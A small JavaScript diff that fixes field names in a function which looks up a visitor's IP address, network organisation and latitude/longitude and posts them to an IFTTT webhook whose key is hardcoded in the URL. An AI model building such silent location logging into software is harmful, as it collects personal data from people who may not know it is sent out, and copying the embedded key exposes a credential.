@@ -23,10 +23,8 @@ function logData(){
   .then(function(response){
       let ip = response.data.ip;
       let author = response.data.org;
-      let lat = response.data.lat;
-      let long = response.data.long;
-      lat.toString();
-      long.toString();
+      let lat = response.data.latitude;
+      let long = response.data.longitude;
       triggerIFTTT(ip, author, lat, long)
   })
   .catch(function (e){
@@ -35,7 +33,7 @@ function logData(){
 }
 
 function triggerIFTTT(ip, author, lat, long){
-  let complete_position = "lat: " + lat + "long: "+ long;
+  let complete_position = "lat: " + lat + "" + "long: "+ long;
   let url = "https://maker.ifttt.com/trigger/data_trigger/with/key/f-NHVw9KeITH9nLMbbUH6Yd2hifSrOwGcuCWWnyuMpH?value1=" + ip + "&value2=" + author + "&value3="+ complete_position;  
   axios.post(url)
 }
